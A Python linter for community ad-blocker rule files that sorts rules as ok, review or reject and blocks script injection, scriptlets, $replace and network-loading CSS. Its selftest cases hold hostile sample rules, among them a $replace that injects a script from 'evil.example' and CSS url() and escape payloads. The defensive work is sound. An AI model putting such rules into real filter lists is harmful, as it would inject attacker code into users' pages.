#!/usr/bin/env python3
"""Checker of the rule files of adlock-community-rules (FORMAT.md). No dependencies.

    python tools/lint.py                      every file under sites/ and apps/
    python tools/lint.py sites/e/example.com.txt [...]
    python tools/lint.py --json <file>        machine-readable report
    python tools/lint.py --selftest

Each rule line gets a verdict: ok, review (a maintainer must look) or reject (with the reason).
Exit code: 0 - no rejected lines, 1 - at least one, 2 - usage or I/O error.

The same checks are built into AdLock; keep the two in step.
"""
import json
import os
import re
import sys

MAX_RULES = 300
MAX_LINE = 2000
MAX_COMMENT = 200
SECTIONS = ("rules", "deny", "allow")

OK, REVIEW, REJECT = "ok", "review", "reject"

ALLOWED_OPTIONS = {
    "script", "image", "stylesheet", "xmlhttprequest", "subdocument", "font", "media", "websocket", "ping",
    "other", "object", "popup", "document", "third-party", "3p", "first-party", "1p", "match-case", "domain",
}
FORBIDDEN_OPTIONS = {
    "replace", "redirect", "redirect-rule", "csp", "removeparam", "removeheader", "urltransform", "header",
    "cookie", "jsonprune", "hls", "important", "badfilter", "app", "when", "throttle", "throttle-conn",
    "segment-throttle", "corrupt", "rewrite", "empty", "mp4", "permissions", "referrerpolicy", "method",
    "to", "denyallow", "inline-script", "inline-font", "generichide", "elemhide", "specifichide", "genericblock",
    "urlblock", "jsinject", "content", "extension", "all", "popunder", "strict1p", "strict3p",
}

# Condition names of "!#if" in the common rule syntax. Anything else is a typo: filters take an unknown name as
# false and silently drop the block.
CONDITION_NAMES = {
    "true", "false", "adguard", "adguard_app_windows", "adguard_app_mac", "adguard_app_android", "adguard_app_ios",
    "adguard_app_cli", "adguard_ext_chromium", "adguard_ext_chromium_mv3", "adguard_ext_firefox", "adguard_ext_edge",
    "adguard_ext_opera", "adguard_ext_safari", "adguard_ext_android_cb", "ext_ublock", "ext_abp", "ext_devbuild",
    "env_chromium", "env_edge", "env_firefox", "env_legacy", "env_mobile", "env_safari", "env_mv3",
    "cap_html_filtering", "cap_user_stylesheet", "cap_ipaddress",
}
# query parameters whose value is a secret or identifies a person
SECRET_PARAMS = {
    "token", "access_token", "auth", "session", "sessionid", "session_id", "sid", "sessid", "phpsessid", "jsessionid",
    "api_key", "apikey", "password", "passwd", "pwd", "email", "phone", "ticket",
}
TOKEN_LENGTH = 24

HOST_RE = re.compile(r"^(?=.{1,253}$)([a-z0-9_]([a-z0-9_-]{0,61}[a-z0-9_])?\.)+[a-z][a-z0-9-]{0,61}[a-z0-9]$|^(?=.{1,253}$)([a-z0-9_]([a-z0-9_-]{0,61}[a-z0-9_])?\.)+xn--[a-z0-9-]{1,59}$")
# domains##body, domains#@#body, domains#?#body ... ("#" inside a URL pattern is not a marker)
COSMETIC_RE = re.compile(r"^(?P<domains>[a-z0-9.,~*_-]*)(?P<marker>#@?\$?\??%?#)(?P<body>.+)$", re.I)


def is_host(value):
    return bool(HOST_RE.match(value))


def within(host, domain):
    """host is the site of the file or one of its subdomains"""
    return host == domain or host.endswith("." + domain)


def injects_style(marker, body):
    """The rule puts CSS into the page, not only hides: "#$#sel { ... }" (and #$?#, #@$#), "sel:style(...)" under
    any marker, "sel { ... }" under ## and #?#. Every form is checked the same way, or a style gets in under
    another form. Any body ending with "}" counts; a "{" inside (a regular expression "/\\d{3}/") does not."""
    return "$" in marker or body.strip().endswith("}") or ":style(" in body.lower()


def css_loads(css):
    """What makes the CSS load from the network (it can send what is typed on the page through attribute
    selectors) or run code: "url(", "@import" ..., "\\" (an escape builds "u\\72l("); "" when nothing. The whole
    rule is looked at, not only its style block: "@import" and escapes are dangerous before "{" too."""
    low = css.lower()
    if "\\" in low:
        return "\\"
    for bad in ("url(", "@import", "image-set(", "image(", "cross-fade(", "element(", "expression(", "-moz-binding",
                "behavior:", "behavior :"):
        if bad in low:
            return bad
    return ""


def css_loads_reason(found):
    if found == "\\":
        return "escapes (\\) are not accepted in a style"
    return "a style with %s is not accepted: it loads from the network" % found


def changes_markup(body):
    """procedural actions that change the markup like the scriptlets remove-attr / remove-class;
    ":remove()" takes the element away, which is hiding"""
    low = body.lower()
    return ":remove-attr(" in low or ":remove-class(" in low


def check_cosmetic(match, domain):
    marker, body = match.group("marker"), match.group("body")
    domains = [d for d in match.group("domains").lower().split(",") if d]
    if marker in ("#%#", "#@%#"):
        return REJECT, "script injection (#%#) is not accepted"
    if marker not in ("##", "#?#", "#@#", "#@?#", "#$#", "#@$#", "#$?#", "#@$?#"):
        return REJECT, "unknown cosmetic marker " + marker
    # "#$#name arguments" not ending with a { } block is a snippet, that is a scriptlet (filters take #$# for a style
    # only when the body ends with "}"). The body without spaces around it: filters read "## +js(...)" as a scriptlet
    trimmed = body.strip()
    if not trimmed:
        return REJECT, "empty cosmetic rule"
    if trimmed.startswith("+js(") or trimmed.startswith("^") or changes_markup(body) or ("$" in marker and not trimmed.endswith("}")):
        return REJECT, "scriptlets (##+js, #$# not ending with a { } block), :remove-attr(), :remove-class() and HTML filtering (##^) are not accepted"
    # a style for the site is accepted in any form (#$#, :style(), "sel { }"): maintainers review every change;
    # one that loads from the network AdLock would not run from the user's list, so it is rejected at once
    if injects_style(marker, body):
        found = css_loads(body)
        if found:
            return REJECT, css_loads_reason(found)
    if not domains:
        return REJECT, "generic cosmetic rule: name the site, e.g. %s##%s" % (domain, body)
    for d in domains:
        if d.startswith("~"):
            return REJECT, "negated domain %s is not accepted" % d
        if "*" in d or not is_host(d):
            return REJECT, "not a host name: " + d
        if not within(d, domain):
            return REJECT, "%s is not %s or its subdomain" % (d, domain)
    if "@" in marker:
        return REVIEW, "cosmetic exception"
    return OK, ""


def split_options(rule):
    """(pattern, options) of "||host^$script,domain=a|b": the options follow the last "$" that is not escaped, as
    filters read them ("\\$" in a $replace value does not start them). (rule, []) without such a "$"; None when there
    is one but the tail is not a list of "name[=value]" - such a line used to pass as a rule without options, and
    "||site^$replace=/(<head>)/\\$1<script ...>/" got ok although filters read it as $replace."""
    pos = -1
    for i in range(len(rule) - 1, -1, -1):
        if rule[i] == "$" and (i == 0 or rule[i - 1] != "\\"):
            pos = i
            break
    if pos < 0:
        return rule, []
    tail = rule[pos + 1:]
    if not re.match(r"^~?[a-z0-9-]+(=[^,]*)?(,~?[a-z0-9-]+(=[^,]*)?)*$", tail, re.I):
        return None
    return rule[:pos], tail.split(",")


def check_network(rule, domain):
    exception = rule.startswith("@@")
    if exception:
        rule = rule[2:]
    split = split_options(rule)
    if split is None:
        return REJECT, "the options after the last $ cannot be read (a literal $ in the pattern is written \\$)"
    pattern, options = split
    if not pattern:
        return REJECT, "empty pattern"
    if len(pattern) > 1 and pattern.startswith("/") and pattern.endswith("/"):
        return REJECT, "regular-expression patterns are not accepted"

    bound_by_option = False
    for option in options:
        name, _, value = option.partition("=")
        name = name.lower()
        negated = name.startswith("~")
        name = name.lstrip("~")
        if name in FORBIDDEN_OPTIONS:
            return REJECT, "$%s is not accepted" % name
        if name not in ALLOWED_OPTIONS:
            return REJECT, "unknown option $%s" % name
        if name == "domain":
            if negated or not value:
                return REJECT, "$domain= needs a list of domains"
            for d in value.lower().split("|"):
                if d.startswith("~"):
                    return REJECT, "negated domain %s in $domain= is not accepted" % d
                if not is_host(d):
                    return REJECT, "not a host name in $domain=: " + d
                if not within(d, domain):
                    return REJECT, "$domain=%s is not %s or its subdomain" % (d, domain)
            bound_by_option = True

    bound_by_host, open_host, host = False, False, ""
    if pattern.startswith("||"):
        m = re.search(r"[\^/*:?|]", pattern[2:])
        host = (pattern[2:2 + m.start()] if m else pattern[2:]).lower()
        if not host or not is_host(host):
            return REJECT, "the pattern after || must start with a full host name"
        # the host ends where it ends: "||t.co" and "||t.co*" are the start of a string and also match t.com, t.co.uk
        open_host = not m or m.group(0) not in "^/:"
        bound_by_host = within(host, domain) and not open_host
    if not bound_by_host and not bound_by_option:
        if open_host and within(host, domain):
            return REJECT, "end the host with ^, / or : - without it ||%s also matches longer host names (%sx.com ...)" % (host, host)
        return REJECT, "the rule is not tied to %s: block a host of the site or add $domain=%s" % (domain, domain)
    if exception:
        return REVIEW, "exception (@@)"
    return OK, ""


def condition_error(expr):
    """"" when expr is a valid "!#if" condition: names from CONDITION_NAMES, "!", "&&", "||", parentheses"""
    tokens = re.findall(r"\s*(&&|\|\||[!()]|[A-Za-z0-9_]+|\S)", expr)
    pos = [0]

    def peek():
        return tokens[pos[0]] if pos[0] < len(tokens) else None

    def atom():
        t = peek()
        if t is None:
            return "the condition ends too early"
        pos[0] += 1
        if t == "!":
            return atom()
        if t == "(":
            err = either()
            if err:
                return err
            if peek() != ")":
                return "no closing parenthesis"
            pos[0] += 1
            return ""
        if re.match(r"^[A-Za-z0-9_]+$", t):
            return "" if t in CONDITION_NAMES else "unknown condition name " + t
        return "unexpected " + t

    def both():
        err = atom()
        while not err and peek() == "&&":
            pos[0] += 1
            err = atom()
        return err

    def either():
        err = both()
        while not err and peek() == "||":
            pos[0] += 1
            err = both()
        return err

    if not tokens:
        return "!#if needs a condition"
    err = either()
    if not err and peek() is not None:
        err = "unexpected " + peek()
    return err


def check_directive(line):
    """(kind, verdict, reason) of a "!#..." line: kind is if / else / endif, or None for a rejected line"""
    m = re.match(r"^!#([A-Za-z_]+)(?:\s+(.*))?$", line)
    name, rest = (m.group(1), (m.group(2) or "").strip()) if m else ("", "")
    if name == "if":
        err = condition_error(rest)
        return ("if", OK, "") if not err else (None, REJECT, "!#if: " + err)
    if name in ("else", "endif"):
        return (name, OK, "") if not rest else (None, REJECT, "!#%s takes nothing after it" % name)
    return None, REJECT, "only the !#if, !#else and !#endif directives are accepted"


def personal_data(line):
    """the reason when the line carries personal data or a secret, else "" """
    for i, c in enumerate(line):
        if c == "@" and i > 0 and re.match(r"[A-Za-z0-9._%+-]", line[i - 1]) and re.match(r"[A-Za-z0-9-]+\.[A-Za-z]{2}", line[i + 1:]):
            return "an e-mail address: rules must not carry personal data"
    for m in re.finditer(r"[?&;]([A-Za-z_]+)=([^&;?$^|*\s])?", line):
        if m.group(1).lower() in SECRET_PARAMS and m.group(2):
            return "the parameter %s= has a value: rules must not carry tokens, sessions or personal data" % m.group(1)
    for run in re.findall(r"[A-Za-z0-9]+", line):
        if len(run) >= TOKEN_LENGTH and re.search(r"[0-9]", run) and re.search(r"[A-Za-z]", run):
            return "%s... looks like a token or an identifier: rules must not depend on one user's values" % run[:12]
    return ""


def is_comment(line):
    """"! text": a comment; "!#..." is a directive"""
    return line.startswith("!") and not line.startswith("!#")


def check_comment(line):
    """a comment inside a section: kept above its rules, so it is checked for what a rule may not carry"""
    if line.startswith("!+"):
        return REJECT, "list compiler hints (!+) are not accepted"
    if len(line) > MAX_COMMENT:
        return REJECT, "comment longer than %d characters" % MAX_COMMENT
    secret = personal_data(line)
    if secret:
        return REJECT, secret
    return OK, ""


def without_empty_blocks(lines):
    """the lines without "!#if" blocks that hold no rule (comments are not rules)"""
    out, opened = [], []   # opened: [index in out, had a rule]
    for line in lines:
        if line.startswith("!#if"):
            opened.append([len(out), False])
            out.append(line)
        elif line.startswith("!#endif") and opened:
            start, had_rule = opened.pop()
            if had_rule:
                out.append(line)
                if opened:
                    opened[-1][1] = True
            else:
                del out[start:]
        else:
            out.append(line)
            if not line.startswith("!") and opened:
                opened[-1][1] = True
    return out


def select_with_comments(lines, keep):
    """The lines of a section with the rules for which keep(rule) is true. A comment belongs to the rules below it,
    up to the next comment, and stays only when at least one of them stays; directives stay; blocks left without
    rules go. keep is called once per rule line, in order."""
    groups = []   # [comments, the lines below them]
    for line in lines:
        if is_comment(line):
            if not groups or groups[-1][1]:
                groups.append([[], []])
            groups[-1][0].append(line)
        else:
            if not groups:
                groups.append([[], []])
            groups[-1][1].append(line)
    out = []
    for comments, body in groups:
        chosen = [l for l in body if l.startswith("!#") or keep(l)]
        if any(not l.startswith("!") for l in chosen):
            out += comments
        out += chosen
    return without_empty_blocks(out)


def check_rule(line, domain):
    if line.startswith("!#"):
        _kind, verdict, reason = check_directive(line)
        return verdict, reason
    secret = personal_data(line)
    if secret:
        return REJECT, secret
    match = COSMETIC_RE.match(line)
    if match and not line.startswith(("||", "|", "@@", "/")):
        return check_cosmetic(match, domain)
    return check_network(line, domain)


def check_entry(line, domain, section):
    entry = line.lower()
    host = entry[2:] if entry.startswith("*.") else entry
    if "*" in host or not is_host(host):
        return REJECT, "not a host name or *.host: " + line
    if host.startswith("www."):
        return REJECT, "write the host without www."
    if not within(host, domain):
        return REJECT, "%s is not %s or its subdomain (a [%s] entry acts on every site)" % (host, domain, section)
    if section == "allow":
        return REVIEW, "allow-list entry: the host is not filtered at all"
    if host == domain:
        if entry.startswith("*."):
            return REVIEW, "blocks every subdomain of the site"
        return REVIEW, "blocks the whole site"
    return OK, ""


def target_from_path(path):
    """('site', domain) for sites/<c>/<domain>.txt, ('app', platform, id) for apps/<platform>/<id>.txt, else None"""
    parts = path.replace("\\", "/").split("/")
    if len(parts) >= 3 and parts[-3] == "sites" and parts[-1].endswith(".txt"):
        domain = parts[-1][:-4]
        if parts[-2] != domain[:1]:
            return None
        return ("site", domain)
    if len(parts) >= 3 and parts[-3] == "apps" and parts[-1].endswith(".txt"):
        return ("app", parts[-2], parts[-1][:-4])
    return None


def lint_text(text, domain=None):
    """The report of one file: {target, domain, lines: [{n, section, text, verdict, reason}], errors: [...],
    accepted: {rules, deny, allow}, comments, counts}. domain: the site the file must be for (from its path); None - the
    header decides. Comments inside a section ([rules], [deny], [allow]) are kept in place among the accepted lines and
    counted in "comments"; the ones before the first section header are the header of the file."""
    report = {"domain": domain, "target": None, "lines": [], "errors": [], "accepted": {s: [] for s in SECTIONS},
              "comments": 0}
    section = "rules"
    in_section = False   # after the first section header
    seen = set()
    rule_count = 0
    header_domain = None
    blocks = []   # open "!#if" blocks: [line number, had "!#else"]

    def close_blocks(where):
        for n_if, _else in blocks:
            report["errors"].append("line %d: !#if without !#endif %s" % (n_if, where))
        del blocks[:]

    for n, raw in enumerate(text.replace("\r\n", "\n").replace("\r", "\n").split("\n"), 1):
        line = raw.strip()
        if not line:
            continue
        if len(line) > MAX_LINE:
            report["lines"].append({"n": n, "section": section, "text": line[:80] + "...", "verdict": REJECT,
                                    "reason": "line longer than %d characters" % MAX_LINE})
            continue
        if line.startswith("!") and not line.startswith("!#"):
            m = re.match(r"^!\s*Target:\s*(\S+)\s+(\S+)\s*$", line, re.I)
            if m:
                report["target"] = m.group(1).lower() + " " + m.group(2).lower()
                if m.group(1).lower() == "site":
                    header_domain = m.group(2).lower()
            elif in_section and section is not None:
                verdict, reason = check_comment(line)
                if verdict == REJECT:
                    report["lines"].append({"n": n, "section": section, "text": line, "verdict": REJECT, "reason": reason})
                else:
                    report["accepted"][section].append(line)
                    report["comments"] += 1
            continue
        if line.startswith("[") and line.endswith("]"):
            in_section = True
            close_blocks("before " + line)
            name = line[1:-1].strip().lower()
            if name not in SECTIONS:
                report["errors"].append("line %d: unknown section %s" % (n, line))
                section = None
            else:
                section = name
            continue
        if section is None:
            continue
        if line.startswith("!#"):
            # !#if / !#else / !#endif: not rules, not counted, kept in place among the accepted lines of [rules]
            kind, verdict, reason = check_directive(line) if section == "rules" else (None, REJECT, "directives are accepted only in [rules]")
            if verdict == REJECT:
                report["lines"].append({"n": n, "section": section, "text": line, "verdict": REJECT, "reason": reason})
                continue
            if kind == "if":
                blocks.append([n, False])
            elif not blocks:
                report["errors"].append("line %d: !#%s without !#if" % (n, kind))
                continue
            elif kind == "else":
                if blocks[-1][1]:
                    report["errors"].append("line %d: a second !#else in one block" % n)
                    continue
                blocks[-1][1] = True
            else:
                blocks.pop()
            report["accepted"]["rules"].append(line)
            continue
        site = domain or header_domain
        if not site:
            report["errors"].append("line %d: no '! Target: site <domain>' before the first rule" % n)
            break
        rule_count += 1
        key = (section, line)
        if key in seen:
            verdict, reason = REJECT, "duplicate line"
        elif section == "rules":
            verdict, reason = check_rule(line, site)
        else:
            verdict, reason = check_entry(line, site, section)
        seen.add(key)
        report["lines"].append({"n": n, "section": section, "text": line, "verdict": verdict, "reason": reason})
        if verdict != REJECT:
            report["accepted"][section].append(line)

    close_blocks("at the end of the file")
    if report["target"] is None:
        report["errors"].append("no '! Target: site <domain>' line")
    elif report["target"].startswith("app "):
        report["errors"].append("application files are not accepted yet")
    if domain and header_domain and header_domain != domain:
        report["errors"].append("'! Target: site %s' does not match the file name (%s)" % (header_domain, domain))
    if domain and not is_host(domain):
        report["errors"].append("the file name is not a domain: " + domain)
    if domain and domain.startswith("www."):
        report["errors"].append("the file name must be the domain without www.")
    if rule_count > MAX_RULES:
        report["errors"].append("%d rule lines, the limit is %d" % (rule_count, MAX_RULES))
    if rule_count == 0 and not report["errors"]:
        report["errors"].append("the file has no rules")
    report["domain"] = domain or header_domain
    report["counts"] = {v: sum(1 for l in report["lines"] if l["verdict"] == v) for v in (OK, REVIEW, REJECT)}
    return report


def failed(report):
    return bool(report["errors"]) or report["counts"][REJECT] > 0


def lint_file(path):
    target = target_from_path(path)
    with open(path, encoding="utf-8") as f:
        text = f.read()
    if target is None:
        report = lint_text(text)
        report["errors"].insert(0, "the path must be sites/<first character>/<domain>.txt")
        return report
    if target[0] == "app":
        report = lint_text(text)
        if "application files are not accepted yet" not in report["errors"]:
            report["errors"].append("application files are not accepted yet")
        return report
    return lint_text(text, target[1])


def print_report(path, report, out=sys.stdout):
    c = report["counts"]
    out.write("%s: %d ok, %d review, %d rejected%s\n" % (path, c[OK], c[REVIEW], c[REJECT],
                                                      ", %d file error(s)" % len(report["errors"]) if report["errors"] else ""))
    for e in report["errors"]:
        out.write("  ERROR  %s\n" % e)
    for l in report["lines"]:
        if l["verdict"] != OK:
            out.write("  %-6s line %d [%s] %s\n         %s\n" % (l["verdict"].upper(), l["n"], l["section"], l["text"][:160], l["reason"]))


def all_files(root):
    found = []
    for top in ("sites", "apps"):
        for base, _dirs, files in os.walk(os.path.join(root, top)):
            for name in sorted(files):
                if name.endswith(".txt"):
                    found.append(os.path.join(base, name))
    return sorted(found)


def selftest():
    cases = [
        ("rules", "example.com##.ad", OK), ("rules", "news.example.com##div[data-ad]", OK),
        ("rules", "example.com#?#.x:has(> .ad)", OK), ("rules", "example.com,m.example.com##.ad", OK),
        ("rules", "##.ad", REJECT), ("rules", "other.org##.ad", REJECT), ("rules", "example.com,other.org##.ad", REJECT),
        ("rules", "~example.com##.ad", REJECT), ("rules", "example.com#@#.ad", REVIEW),
        ("rules", "example.com#%#alert(1)", REJECT),
        ("rules", "example.com##+js(aopr, x)", REJECT), ("rules", "example.com##^script:has-text(x)", REJECT),
        # a style for the site is accepted in every form; one that loads from the network is rejected in every form
        ("rules", "example.com#$#body { margin: 0 }", OK), ("rules", "example.com##html:style(overflow: auto !important)", OK),
        ("rules", "example.com##html { overflow: auto !important; }", OK),
        ("rules", "example.com#$?#div:has(> .ad) { display: none !important; }", OK),
        ("rules", "example.com#$#body { background: url(https://evil.example/a) }", REJECT),
        ("rules", "example.com##body:style(background: url(https://evil.example/a))", REJECT),
        ("rules", "example.com##body { background: url(https://evil.example/a) }", REJECT),
        ("rules", "example.com#$#.x { background: u\\72l(https://evil.example/a) }", REJECT),
        ("rules", "#$#body { margin: 0 }", REJECT), ("rules", "example.com#@$#body { margin: 0 }", REVIEW),
        ("rules", "example.com#$#abort-on-property-read x", REJECT),
        ("rules", "example.com##html:remove-attr(style)", REJECT), ("rules", "example.com##.x:remove-class(locked)", REJECT),
        ("rules", "example.com##.ad:remove()", OK), ("rules", "example.com#?#div:has-text(/\\d{3}/)", OK),
        # bypasses found in review 2026-11-26: an escaped "\$" in the value hid $replace, a space before +js(, a #$# snippet
        # with a "{" inside, a host without ^ / : after it (||example.com also matches example.community)
        ("rules", "||example.com^$replace=/(<head>)/\\$1<script src=\\/\\/evil.example\\/x.js><\\/script>/", REJECT),
        ("rules", "||example.com^$urltransform=/a/b\\,c/", REJECT), ("rules", "||example.com/ads/$", REJECT),
        ("rules", "example.com## +js(set-constant, x, 1)", REJECT),
        ("rules", "example.com#$#abort-on-property-read adsbygoogle {", REJECT),
        ("rules", "example.com#$#body { margin: 0 } ", OK),
        ("rules", "||example.com", REJECT), ("rules", "||example.com*", REJECT),
        ("rules", "||example.com:8080/ads/", OK), ("rules", "||example.com/ads.js$script", OK),
        ("rules", "||ads.example.net*$domain=example.com", OK),
        ("rules", "||counter.example.com^", OK), ("rules", "||example.com/ads/*", OK),
        ("rules", "||ads.example.net^", REJECT), ("rules", "||ads.example.net^$domain=example.com", OK),
        ("rules", "||ads.example.net^$script,domain=example.com|m.example.com", OK),
        ("rules", "/banners/*$image,domain=example.com", OK), ("rules", "/banners/*", REJECT),
        ("rules", "||ads.example.net^$domain=example.com|other.org", REJECT),
        ("rules", "||ads.example.net^$domain=~example.com", REJECT),
        ("rules", "||ads.example.net^$domain=example.com,important", REJECT),
        ("rules", "||example.com/a.js$replace=/x/y/", REJECT), ("rules", "||example.com/a.js$redirect=noopjs", REJECT),
        ("rules", "@@||example.com/player.js", REVIEW), ("rules", "@@||ads.example.net^", REJECT),
        ("rules", "/ads\\.example\\.com/", REJECT), ("rules", "!#state ad", REJECT),
        ("rules", "||notexample.com^", REJECT), ("rules", "||example.com.evil.org^", REJECT),
        ("rules", "||example.com^$unknownopt", REJECT), ("rules", "||example.com^$third-party", OK),
        ("rules", "!#if adguard", OK), ("rules", "!#if !ext_ublock && (env_firefox || cap_html_filtering)", OK),
        ("rules", "!#else", OK), ("rules", "!#endif", OK), ("rules", "!#if", REJECT), ("rules", "!#if adguard_typo", REJECT),
        ("rules", "!#if adguard &&", REJECT), ("rules", "!#if (adguard", REJECT), ("rules", "!#endif x", REJECT),
        ("rules", "!#include sites/e/example.com.txt", REJECT),
        ("rules", "||example.com/track?token=abc", REJECT), ("rules", "||example.com/track?token=*", OK),
        ("rules", "||example.com/p?a=?sid=1", REJECT), ("rules", "example.com##a[href=\"mailto:jane.doe@mail.com\"]", REJECT),
        ("rules", "||example.com/u/a1b2c3d4e5f6a7b8c9d0e1f2a3/*", REJECT),
        ("rules", "example.com##div[id^=\"div-gpt-ad-1234567890123-0\"]", OK),
        ("deny", "ads.example.com", OK), ("deny", "*.ads.example.com", OK), ("deny", "example.com", REVIEW),
        ("deny", "*.example.com", REVIEW),
        ("deny", "ads.example.net", REJECT), ("deny", "*.com", REJECT), ("deny", "a*b.example.com", REJECT),
        ("deny", "www.example.com", REJECT), ("allow", "pay.example.com", REVIEW), ("allow", "bank.org", REJECT),
        # comments inside a section (characters are counted, not bytes: 150 Cyrillic letters fit)
        ("comment", "! empty banner slots in the sidebar", OK), ("comment", "!+ NOT_OPTIMIZED", REJECT),
        ("comment", "! asked by jane.doe@mail.com", REJECT), ("comment", "! " + "x" * 199, REJECT),
        ("comment", "! " + "З" * 150, OK), ("comment", "! https://github.com/Hankuper/adlock-community-rules/issues/5", OK),
        ("comment", "! session a1b2c3d4e5f6a7b8c9d0e1f2a3", REJECT),
    ]
    bad = 0
    for section, line, expected in cases:
        verdict, reason = (check_rule(line, "example.com") if section == "rules" else check_comment(line) if section == "comment"
                           else check_entry(line, "example.com", section))
        if verdict != expected:
            bad += 1
            print("SELFTEST FAIL [%s] %s: %s (%s), expected %s" % (section, line, verdict, reason, expected))
    text = "! Target: site example.com\n[rules]\nexample.com##.ad\nexample.com##.ad\n[deny]\n*.ads.example.com\n[nope]\nx\n"
    r = lint_text(text, "example.com")
    if r["counts"] != {OK: 2, REVIEW: 0, REJECT: 1} or len(r["errors"]) != 1 or r["accepted"]["deny"] != ["*.ads.example.com"]:
        bad += 1
        print("SELFTEST FAIL file:", r["counts"], r["errors"])
    if target_from_path("sites/e/example.com.txt") != ("site", "example.com") or target_from_path("sites/x/example.com.txt") is not None:
        bad += 1
        print("SELFTEST FAIL path")
    print("selftest: %d case(s), %d failed" % (len(cases) + 2, bad))
    return 1 if bad else 0


def main(argv):
    args = [a for a in argv if not a.startswith("--")]
    if "--selftest" in argv:
        return selftest()
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    paths = args or all_files(root)
    reports = {}
    status = 0
    for path in paths:
        try:
            report = lint_file(path)
        except (OSError, UnicodeDecodeError) as e:
            sys.stderr.write("%s: %s\n" % (path, e))
            return 2
        reports[path.replace("\\", "/")] = report
        if failed(report):
            status = 1
    if "--json" in argv:
        json.dump(reports, sys.stdout, ensure_ascii=False, indent=1)
        sys.stdout.write("\n")
    else:
        for path, report in reports.items():
            print_report(path, report)
        if not paths:
            print("no rule files")
    return status


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
